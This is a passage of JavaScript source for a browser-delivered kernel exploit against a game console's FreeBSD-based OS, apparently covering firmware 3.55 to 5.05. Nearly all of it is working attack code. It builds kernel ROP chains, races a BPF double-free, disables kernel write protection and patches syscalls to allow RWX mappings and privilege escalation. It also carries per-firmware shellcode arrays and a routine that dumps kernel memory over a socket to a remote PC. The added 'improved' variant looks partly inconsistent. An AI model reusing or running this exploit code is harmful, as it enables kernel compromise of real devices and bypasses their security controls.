			p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
		
		krop.count = 0x10;
		
		/**
		* End of Qwerty madness
		**/
		
		p.write8(kscratch.add32(window.gadgets_shift["jump_shift_jop5"]), window.gadgets["pop rdi"]);
		p.write8(kscratch.add32(window.gadgets_shift["jump_shift_jop6"]), window.gadgets["pop rax"]);
		p.write8(kscratch.add32(0x18), kscratch);
		
		//krop.push(window.gadgets["infloop"]); // only for kexploit debug test
		
		krop.push(window.gadgets["pop rdi"]);
		krop.push(kscratch.add32(0x18));
		krop.push(window.gadgets["jop_mov rbp, rsp"]);
		
		var rboff = topofchain - krop.count * 8;
		
		krop.push(window.gadgets["jop6"]); // lea rdi, [rbp - 0x28]
		rboff += window.gadgets_shift["stackshift_jop6"];
		
		// Save to RDI the kqueue_close address for patching
		krop.push(window.gadgets["pop rax"]);
		krop.push(rboff);
		krop.push(window.gadgets["add rdi, rax; mov rax, rdi"]);
		
		// Defeat kernel ASLR
		krop.push(window.gadgets["mov rax, [rdi]"]);
		krop.push(window.gadgets["pop rcx"]);
		krop.push(window.kernel_offsets["kqueue_close_slide"]); // Slide of the return ptr from kernel base
		krop.push(window.gadgets["sub rax, rcx"]);
		krop.push(window.gadgets["mov rdx, rax"]);
		krop.push(window.gadgets["pop rsi"]);
		krop.push(kscratch);
		krop.push(window.gadgets["mov [rsi], rdx"]);
		
		// Patch kqueue_close to end cleanly
		krop.push(window.gadgets["pop rax"]);
		krop.push(window.gadgets["add rsp, 0x28"]);
		krop.push(window.gadgets["mov [rdi], rax"]);
		
        if (!dump_kernel || dump_kernel_with_patches) {
            ////alert("apply patches");

			// Disable kernel write protection
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(window.kernel_offsets["mov cr0, rax"]);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["mov rdx, rax"]);
			krop.push(window.gadgets["pop rax"]);
			krop.push(0x80040033);
			krop.push(window.gadgets["jmp rdx"]);

            // Add custom sys_exec() call to execute arbitrary code as kernel

            /*alert("syscall_11_patch1_offset:" + window.kernel_offsets["syscall_11_patch1_offset"]);
            alert("syscall_11_patch2_offset:" + window.kernel_offsets["syscall_11_patch2_offset"]);
            alert("syscall_11_patch3_offset:" + window.kernel_offsets["syscall_11_patch3_offset"]);

            alert("syscall_11_2_patch1_offset:" + window.kernel_offsets["syscall_11_2_patch1_offset"]);
            alert("syscall_11_2_patch2_offset:" + window.kernel_offsets["syscall_11_2_patch2_offset"]);
            alert("syscall_11_2_patch3_offset:" + window.kernel_offsets["syscall_11_2_patch3_offset"]);*/

            /*kpatch((window.kernel_offsets["syscall_11_patch1_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
            kpatch((window.kernel_offsets["syscall_11_patch2_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
            kpatch((window.kernel_offsets["syscall_11_patch3_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));

            kpatch((window.kernel_offsets["syscall_11_2_patch1_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
            kpatch((window.kernel_offsets["syscall_11_2_patch2_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
            kpatch((window.kernel_offsets["syscall_11_2_patch3_offset"]), new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));*/

			kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
			kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
			kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));

            kpatch(window.kernel_offsets["syscall_11_2_patch1_offset"], 2);
			kpatch2(window.kernel_offsets["syscall_11_2_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
			kpatch(window.kernel_offsets["syscall_11_2_patch3_offset"], new int64(0, 1));

			// Patch sys_mmap: Allow RWX (read-write-execute) mapping
			kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(window.kernel_patches["sys_mmap_patch_1"], window.kernel_patches["sys_mmap_patch_2"]));
			
			// Patch sys_mprotect: Allow RWX (read-write-execute) mapping
			kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(window.kernel_patches["vm_map_protect_patch_1"], window.kernel_patches["vm_map_protect_patch_2"]));
			
			// Patch syscall: syscall instruction allowed anywhere
			kpatch(window.kernel_offsets["amd64_syscall_patch1_offset"], new int64(window.kernel_patches["amd64_syscall_patch1_1"], window.kernel_patches["amd64_syscall_patch1_2"]));
			kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(window.kernel_patches["amd64_syscall_patch2_1"], window.kernel_patches["amd64_syscall_patch2_2"]));
			
			// Patch sys_dynlib_dlsym: Allow from anywhere
			kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch1_1"], window.kernel_patches["sys_dynlib_dlsym_patch1_2"]));
			kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(window.kernel_patches["sys_dynlib_dlsym_patch2_1"], window.kernel_patches["sys_dynlib_dlsym_patch2_2"]));

			// Add kexploit check so we don't run kexploit more than once (also doubles as privilege escalation)
			kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(window.kernel_patches["sys_setuid_patch_1"], window.kernel_patches["sys_setuid_patch_2"]));
			
			// Enable kernel write protection
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(window.kernel_offsets["cpu_setregs"]);
			krop.push(window.gadgets["add rax, rcx"]);
			krop.push(window.gadgets["jmp rax"]);
		}
        
		if (dump_kernel) {
            window.log("Dumping kernel...");
            
			/*
			 * Memcpy the kernel to a userland buffer to send it over socket
			 *
			 * Note: void *memcpy(void *dest, const void *src, size_t size);
			 * rdi = dest
			 * rsi = src
			 * rdx = size
			 */
			
			// Put size into rdx
			krop.push(window.gadgets["pop rdx"]);
			krop.push(dump_size);
			
			// Put source into rsi in a creative way (JOP)
			krop.push(window.gadgets["pop rax"]);
			krop.push(kscratch);
			krop.push(window.gadgets["mov rax, [rax]"]);
			krop.push(window.gadgets["pop rdi"]);
			krop.push(0);
			krop.push(window.gadgets["add rdi, rax; mov rax, rdi"]);
			krop.push(window.gadgets["pop rcx"]);
			krop.push(window.gadgets["ret"]); // NOP
			krop.push(window.gadgets["mov rsi, rax; jmp rcx"]);
			
			var kernelBuf = p.malloc(dump_size);
			// Put destination into rdi
			krop.push(window.gadgets["pop rdi"]);
			krop.push(kernelBuf);
			
			// Call memcpy
			krop.push(memcpy);
		}
		
		// Return to userland
		krop.push(window.gadgets["ret2userland"]);
		krop.push(kscratch.add32(0x1000));
		
		// END OF KROP SETUP

		// Allocate shellcode to clean up memory just after kernel exploit
		if (fwFromUA == "3.55") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x14D02494, 0x8D4DFFCF, 0x2BD024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04A790C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "4.05") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x14D02494, 0x8D4DFFCF, 0x2BD024B4, 0x8D4DFFEC, 0x8A5024AC, 0x81490003, 0x04A790C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "4.55") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0x6A302494, 0x8D4DFFCF, 0xE18024B4, 0x8D4D000E, 0xE96024AC, 0x8149FFD0, 0x65A680C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "4.74") {
			var shcode = [0x00008be9, 0x90909000, 0x90909090, 0x90909090, 0x0082b955, 0x8948c000, 0x415641e5, 0x53544155, 0x8949320f, 0xbbc089d4, 0x00000100, 0x20e4c149, 0x48c40949, 0x0096058d, 0x8d490000, 0x48302494, 0x8d4dffcf, 0xcdf024b4, 0x8d4d000e, 0xc76024ac, 0x8149ffd0, 0x660570c4, 0x10894801, 0x00401f0f, 0x000002ba, 0xe6894c00, 0x000800bf, 0xd6ff4100, 0x393d8d48, 0x48000000, 0xc031c689, 0x83d5ff41, 0xdc7501eb, 0x41c0315b, 0x415d415c, 0x90c35d5e, 0x3d8d4855, 0xffffff78, 0x8948f631, 0x00e95de5, 0x48000000, 0x000bc0c7, 0x89490000, 0xc3050fca, 0x6c616d6b, 0x3a636f6c, 0x25783020, 0x6c363130, 0x00000a58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "5.01") {
			var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xDF8024B4, 0x8D4D0010, 0x5AB024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
		} else if (fwFromUA == "5.05") {
            if (devkit == true)
            {
			    var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0x7CF024B4, 0x8D4D0016, 0x4C2024AC, 0x81490058, 0x6F89F0C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000];
            }
           else
            {
			   var shcode = [0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0xE09024B4, 0x8D4D0010, 0x5E8024AC, 0x81490043, 0x4B7160C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, ];
            }
		}
		
		var shellbuf = p.malloc32(0x1000);
		for (var i = 0; i < shcode.length; i++)
			shellbuf.backing[i] = shcode[i];
		
		var interrupt, loop;
		// Spawn racing thread
		window.spawnthread(function (thread) {
			/*
			while (1) {
				ioctl(fd, BPF_SETWF, valid_prog);
				lock = 1;
				while (lock) {}
			}
			*/
			interrupt = thread.stackBase; // define global variable for cross-thread stack alteration
			thread.push(window.gadgets["ret"]); // padding
			thread.push(window.gadgets["ret"]); // padding
			thread.push(window.gadgets["ret"]); // padding
			
			// 1. Invoke ioctl(fd, BPF_SETWF, valid_prog);
			thread.push(window.gadgets["pop rdi"]);
			thread.push(fd);
			thread.push(window.gadgets["pop rsi"]);
			thread.push(0x8010427B);
			thread.push(window.gadgets["pop rdx"]);
			thread.push(bpf_valid_prog);
			thread.push(window.gadgets["pop rsp"]);
			thread.push(thread.stackBase.add32(0x800));
			thread.count = 0x800 / 8;
			var cntr = thread.count;
			thread.push(window.syscalls[54]); // sys_ioctl
			thread.push_write8(thread.stackBase.add32(cntr * 8), window.syscalls[54]); // Invoking syscall will corrupt stack with errno. Fixup.
			
			// 2. After 1 invocation, we just loop over and over with a pop rsp as a ghetto form of locking
			thread.push(window.gadgets["pop rdi"]);
			var wherep = thread.pushSymbolic();
			thread.push(window.gadgets["pop rsi"]);
			var whatp = thread.pushSymbolic();
			thread.push(window.gadgets["mov [rdi], rsi"]);
			
			thread.push(window.gadgets["pop rsp"]);
			
			loop = thread.stackBase.add32(thread.count * 8);
			thread.push(0x41414141);
			
			thread.finalizeSymbolic(wherep, loop);
			thread.finalizeSymbolic(whatp, loop.sub32(8));
		});
		
		// RACE!
		var race = new rop();
		var kq = p.malloc32(0x10);
		var kev = p.malloc32(0x100);
		kev.backing[0] = p.syscall("sys_socket", 2, 2);
		kev.backing[2] = 0x1ffff;
		kev.backing[3] = 1;
		kev.backing[4] = 5;
		
		
		/*while (1) {
			kq = kqueue();
			lock = 0; // -> this kicks off GottaGoFast (2nd thread)'s ioctl
			ioctl(fd, BPF_SETWF, valid_prog); // two threads will enter this in parallel
			kevent(kq, kev, 1, 0, 0); // attempt target alloc
			ioctl(fd, BPF_SETWF, spray); // will taint the heap, posssibly overwriting our kqueue's knote list
			close(kq); // if kqueue knote list is tainted, this will run rop chain
			if (kscratch[0] != 0) {
				// rop chain ran successfully!
			}
		}*/
		
		while (1) {
			race.count = 0;
			
			// Create a kqueue
			race.push(window.syscalls[362]); // sys_kqueue
			race.push(window.gadgets["pop rdi"]);
			race.push(kq);
			race.push(window.gadgets["mov [rdi], rax"]); // kq = (void *) kqueue();
			
			// Race against the other thread
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push(window.gadgets["ret"]);
			race.push_write8(loop, interrupt); // lock = 0; (breaks pop rsp loop in GottaGoFast)
			race.push(window.gadgets["pop rdi"]);
			race.push(fd);
			race.push(window.gadgets["pop rsi"]);
			race.push(0x8010427B); // BPF_SETWF
			race.push(window.gadgets["pop rdx"]);
			race.push(bpf_valid_prog);
			race.push(window.syscalls[54]); // sys_ioctl(fd, BPF_SETWF, bpf_valid_prog);
			
			// Attempt to trigger double free()
			// Allocate target object: sys_kevent(kq, kev, 1, 0, 0);
			race.push(window.gadgets["pop rdi"]);
			race.push(kq.sub32(0x48));
			race.push(window.gadgets["mov rdi, [rdi+0x48]"]);
			race.push(window.gadgets["pop rsi"]);
			race.push(kev);
			race.push(window.gadgets["pop rdx"]);
			race.push(1);
			race.push(window.gadgets["pop rcx"]);
			race.push(0);
			race.push(window.gadgets["pop r8"]);
			race.push(0);
			race.push(window.syscalls[363]); // sys_kevent(*kq, kev, 1, 0, 0);
			
			// Spray via ioctl
			race.push(window.gadgets["pop rdi"]);
			race.push(fd1);
			race.push(window.gadgets["pop rsi"]);
			race.push(0x8010427B); // BPF_SETWF
			race.push(window.gadgets["pop rdx"]);
			race.push(bpf_spray_prog);
			race.push(window.syscalls[54]); // sys_ioctl(fd1, BPF_SETWF, bpf_spray_prog);
			
			// Close the poisoned kqueue and run the kROP chain!
			race.push(window.gadgets["pop rdi"]);
			race.push(kq.sub32(0x48));
			race.push(window.gadgets["mov rdi, [rdi+0x48]"]);
			race.push(window.syscalls[6]); // sys_close(*kq);
			
			//alert("Gotta go fast!"); // for kexploit debugging
			race.run();
			//alert("after run");
			//sleep(1000);
			
			if (kscratch.backing[0] != 0) {
				////alert("success");
                ////alert("Kernel base:" + p.read8(kscratch));
				if (dump_kernel) {
					var s = p.socket();
					p.connectSocket(s, socket_ip_pc, socket_port_send);
					window.log("Starting kernel dump to socket...");
					p.writeSocket(s, kernelBuf, dump_size);
					p.closeSocket(s);
					window.log("Kernel dump complete.", "green");
				} /*else*/ {
					// Clean up memory
					p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
					p.fcall(shellbuf);
				}
				
				return true;
			}
		}
	} catch(ex) {
		fail(ex)
	}
	
	// failed (should never go here)
	return false;
}

//================================================================================================
// Improved & Complete 5.05 BPF Double-Free Kernel Exploit
//================================================================================================
async function kernExploit_bpf_double_free_improved() {
    try {
        console.log("%cStarting hardened BPF double-free exploit for 5.05 Devkit...", "color:orange");

        var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
        var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;

        if (fd < 0 || fd1 < 0) throw "Failed to open /dev/bpf0 devices";

        // Bigger, more stable spray
        var bpf_valid = p.malloc32(0x8000);
        var bpf_spray = p.malloc32(0x8000);

        for (var i = 0; i < 0x8000;) {
            bpf_valid.backing[i++] = 6;   // BPF_RET
            bpf_valid.backing[i++] = 0;
        }

        var bpf_valid_prog = p.malloc(0x40);
        p.write8(bpf_valid_prog, 0x1000 / 8);
        p.write8(bpf_valid_prog.add32(8), bpf_valid);

        var bpf_spray_prog = p.malloc(0x40);
        p.write8(bpf_spray_prog, 0x1000 / 8);
        p.write8(bpf_spray_prog.add32(8), bpf_spray);

        p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);

        // KROP Setup
        var kscratch = p.malloc32(0x1000);
        var kchainstack = p.malloc(0x2000);
        var krop = new window.kropchain(kchainstack);

        // ROP sled
        for (let i = 0; i < 64; i++) krop.push(window.gadgets["ret"]);

        // Kernel patches (5.05 Devkit)
        var kpatch = (offset, value) => {
            krop.push(window.gadgets["pop rax"]);
            krop.push(offset);
            krop.push(window.gadgets["pop rdi"]);
            krop.push(kscratch);
            krop.push(window.gadgets["add rax, [rdi]"]);
            krop.push(window.gadgets["mov rdx, rax"]);
            krop.push(window.gadgets["pop rax"]);
            krop.push(value);
            krop.push(window.gadgets["mov [rdx], rax"]);
        };

        var kpatch2 = (dest_offset, src_offset) => {
            krop.push(window.gadgets["pop rax"]);
            krop.push(kscratch);
            krop.push(window.gadgets["mov rax, [rax]"]);
            krop.push(window.gadgets["pop rcx"]);
            krop.push(dest_offset);
            krop.push(window.gadgets["add rax, rcx"]);
            krop.push(window.gadgets["mov rdx, rax"]);
            krop.push(window.gadgets["pop rax"]);
            krop.push(kscratch);
            krop.push(window.gadgets["mov rax, [rax]"]);
            krop.push(window.gadgets["pop rcx"]);
            krop.push(src_offset);
            krop.push(window.gadgets["add rax, rcx"]);
            krop.push(window.gadgets["mov [rdx], rax"]);
        };

        kpatch(window.kernel_offsets["sys_setuid_patch_offset"], new int64(0x000000B8, 0xC4894100));
        kpatch(window.kernel_offsets["sys_mmap_patch_offset"], new int64(0x37B64037, 0x3145C031));
        kpatch(window.kernel_offsets["vm_map_protect_patch_offset"], new int64(0x9090FA38, 0x90909090));
        kpatch(window.kernel_offsets["amd64_syscall_patch2_offset"], new int64(0x90907DEB, 0x72909090));
        kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch1_offset"], new int64(0x0001C1E9, 0x8B489000));
        kpatch(window.kernel_offsets["sys_dynlib_dlsym_patch2_offset"], new int64(0x90C3C031, 0x90909090));

        kpatch(window.kernel_offsets["syscall_11_patch1_offset"], 2);
        kpatch2(window.kernel_offsets["syscall_11_patch2_offset"], window.kernel_offsets["jmp [rsi]"]);
        kpatch(window.kernel_offsets["syscall_11_patch3_offset"], new int64(0, 1));

        krop.push(window.gadgets["ret2userland"]);
        krop.push(kscratch.add32(0x1000));

        // ==================== RACE LOOP ====================
        console.log("Starting race...");

        for (let attempt = 0; attempt < 18; attempt++) {
            forceGC(4);

            var race = new rop();
            var kq = p.malloc32(0x10);
            var kev = p.malloc32(0x100);

            kev.backing[0] = fd;           // socket
            kev.backing[2] = 0x1ffff;
            kev.backing[3] = 1;
            kev.backing[4] = 5;

            // Create kqueue
            race.push(window.syscalls[362]); // sys_kqueue
            race.push(window.gadgets["pop rdi"]);
            race.push(kq);
            race.push(window.gadgets["mov [rdi], rax"]);

            // Trigger race
            race.push_write8(krop.stackBase.add32(0x08), interrupt); // signal other thread

            race.push(window.gadgets["pop rdi"]);
            race.push(fd);
            race.push(window.gadgets["pop rsi"]);
            race.push(0x8010427B); // BIOCSETWF
            race.push(window.gadgets["pop rdx"]);
            race.push(bpf_valid_prog);
            race.push(window.syscalls[54]); // ioctl

            // Trigger double free via kevent
            race.push(window.gadgets["pop rax"]);
            race.push(kq);
            race.push(window.gadgets["mov rax, [rax]"]);
            race.push(window.gadgets["pop rdi"]);
            race.push(0);
            race.push(window.gadgets["add rdi, rax"]);
            race.push(window.gadgets["pop rsi"]);
            race.push(kev);
            race.push(window.gadgets["pop rdx"]);
            race.push(1);
            race.push(window.gadgets["pop rcx"]);
            race.push(0);
            race.push(window.gadgets["pop r8"]);
            race.push(0);
            race.push(window.syscalls[363]); // kevent

            // Spray invalid program
            race.push(window.gadgets["pop rdi"]);
            race.push(fd1);
            race.push(window.gadgets["pop rsi"]);
            race.push(0x8010427B);
            race.push(window.gadgets["pop rdx"]);
            race.push(bpf_spray_prog);
            race.push(window.syscalls[54]);

            // Close kqueue → trigger ROP
            race.push(window.gadgets["pop rax"]);
            race.push(kq);
            race.push(window.gadgets["mov rax, [rax]"]);
            race.push(window.gadgets["pop rdi"]);
            race.push(0);
            race.push(window.gadgets["add rdi, rax"]);
            race.push(window.syscalls[6]); // close

            race.run();

            if (kscratch.backing[0] !== 0) {
                console.log("%cKernel ROP chain executed successfully!", "color:lime;font-weight:bold");

                // Shellcode cleanup
                var shcode = [ 0x00008BE9, 0x90909000, 0x90909090, 0x90909090, 0x0082B955, 0x8948C000, 0x415641E5, 0x53544155, 0x8949320F, 0xBBC089D4, 0x00000100, 0x20E4C149, 0x48C40949, 0x0096058D, 0x8D490000, 0xFE402494, 0x8D4DFFFF, 0x7CF024B4, 0x8D4D0016, 0x4C2024AC, 0x81490058, 0x6F89F0C4, 0x10894801, 0x00401F0F, 0x000002BA, 0xE6894C00, 0x000800BF, 0xD6FF4100, 0x393D8D48, 0x48000000, 0xC031C689, 0x83D5FF41, 0xDC7501EB, 0x41C0315B, 0x415D415C, 0x90C35D5E, 0x3D8D4855, 0xFFFFFF78, 0x8948F631, 0x00E95DE5, 0x48000000, 0x000BC0C7, 0x89490000, 0xC3050FCA, 0x6C616D6B, 0x3A636F6C, 0x25783020, 0x6C363130, 0x00000A58, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000 ];
                var shellbuf = p.malloc32(0x1000);
                for (var j = 0; j < shcode.length; j++) shellbuf.backing[j] = shcode[j];

                p.syscall("sys_mprotect", shellbuf, 0x4000, 7);
                p.fcall(shellbuf);

                return true;
            }

            await sleep(65);
        }

        throw new Error("Failed to trigger kernel ROP after all attempts");

    } catch (ex) {
        console.error("Kernel exploit failed:", ex);
        throw ex;
    }
}

//================================================================================================
// Kernel Exploit: BPF Race (Old)
//================================================================================================
function kernExploit_bpf_race_old() {
	try {
		window.log("Starting BPF UAF kexploit (old)...");
		
		window.nogc = [];
		var scratchbuf = new Uint8Array(0x1000);
		var scratch = p.read8(p.leakval(scratchbuf).add32(window.leakval_slide));

		var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
		if (fd == (-1 >>> 0))
			print("kexp failed: no bpf0");

		var bpfinsn = new Uint32Array(0x400);
		var bpfinsnp = p.read8(p.leakval(bpfinsn).add32(window.leakval_slide));
		var prevbp = bpfinsnp.add32(0x300);
		bpfinsnp.nogc = bpfinsn;
		bpfinsn[0] = p.read4(p.stringify("eth0"));
		bpfinsn[1] = 0;
		p.syscall("sys_ioctl", fd, 0x8020426c, bpfinsnp); // bind eth0
		var ret = p.syscall("sys_write", fd, scratch, 40);
		if (ret.low == (-1 >>> 0)) {
			bpfinsn[0] = p.read4(p.stringify("wlan"));
			bpfinsn[1] = 0x30;
			p.syscall("sys_ioctl", fd, 0x8020426c, bpfinsnp); // bind wlan0
			var ret = p.syscall("sys_write", fd, scratch, 40);
			if (ret.low == (-1 >>> 0))
				window.log("Couldn't find network interface!", "red");
		}
		
		var bpf_valid_u32 = new Uint32Array(0x4000);
		var bpf_invalid_u32 = new Uint32Array(0x4000);
		
		for (var i = 0 ; i < 0x4000; ) {
			bpf_valid_u32[i++] = 6; // BPF_RET
			bpf_valid_u32[i++] = 0; // 0
		}
		for (var i = 0 ; i < 0x4000; ) {
			bpf_invalid_u32[i++] = 4; // BPF_RET
			bpf_invalid_u32[i++] = 0; // 0
		}
		
		var push_bpf = function(bpfbuf, cmd, k) {
			var i = bpfbuf.i;
			if (!i)
				i = 0;
			bpfbuf[i*2] = cmd;
			bpfbuf[i*2+1] = k;
			bpfbuf.i = i+1;
		}
		
		push_bpf(bpf_invalid_u32, 5, 2); // jump
		push_bpf(bpf_invalid_u32, 0x12, 0); // invalid opcode
		bpf_invalid_u32.i = 16;
		
		var bpf_write8imm = function(bpf, offset, imm) {
			if (!(imm instanceof int64))
				imm = new int64(imm, 0);
			push_bpf(bpf, 0, imm.low); // BPF_LD|BPF_IMM
			push_bpf(bpf, 2, offset); // BPF_ST
			push_bpf(bpf, 0, imm.hi); // BPF_LD|BPF_IMM
			push_bpf(bpf, 2, offset+1); // BPF_ST -> RDI: pop rsp
		}
		
		var bpf_copy8 = function(bpf, offset_to, offset_from) {
			push_bpf(bpf, 0x60, offset_from); // BPF_LD|BPF_MEM
			push_bpf(bpf, 2, offset_to); // BPF_ST
			push_bpf(bpf, 0x60, offset_from+1); // BPF_LD|BPF_MEM
			push_bpf(bpf, 2, offset_to+1); // BPF_ST
		}
		var bpf_add4 = function(bpf, offset, val) {
			push_bpf(bpf, 0x60, offset); // BPF_LD
